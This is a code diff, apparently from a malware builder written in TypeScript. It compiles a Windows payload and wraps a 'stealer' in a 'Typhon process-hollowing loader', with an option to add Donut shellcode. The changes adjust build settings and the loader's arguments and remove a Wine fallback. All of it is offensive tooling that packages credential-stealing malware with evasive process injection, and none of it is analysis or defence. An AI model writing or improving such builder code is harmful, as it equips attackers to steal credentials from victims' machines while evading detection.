@@ -1857,6 +1857,7 @@ func runBoundFiles() {
         ...process.env,
         GOOS: "windows",
         GOARCH: "amd64",
+        GOAMD64: "v1",
         CGO_ENABLED: "0",
         GOWORK: "off",
         GOCACHE: goBuildCacheDir,
@@ -1958,14 +1959,17 @@ func runBoundFiles() {
           const stealerTyphonPath = `${outDir}/${stealerTyphonName}`;
           sendToStream({ type: "output", text: `Wrapping stealer in Typhon process-hollowing loader...\n`, level: "info" });
 
-          const typhonArgs: string[] = ["-build", typhonInput, "-o", stealerTyphonPath];
+          const typhonTemplate = path.join(ensureDataDir(), "tools", "typhon.exe");
+          const typhonArgs: string[] = [
+            "-i", typhonInput,
+            "-o", stealerTyphonPath,
+            "-template", typhonTemplate,
+          ];
           if (config.typhonVariant) typhonArgs.push("-variant", config.typhonVariant);
-          if (config.typhonProcess) typhonArgs.push("-process", config.typhonProcess);
+          if (stealerDonutBin) typhonArgs.push("-donut", stealerDonutBin);
 
           try {
-            const typhonResult = stealerTyphonInfo.useWine
-              ? await $`wine ${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet()
-              : await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+            const typhonResult = await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
 
             if (typhonResult.exitCode !== 0) {
               const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
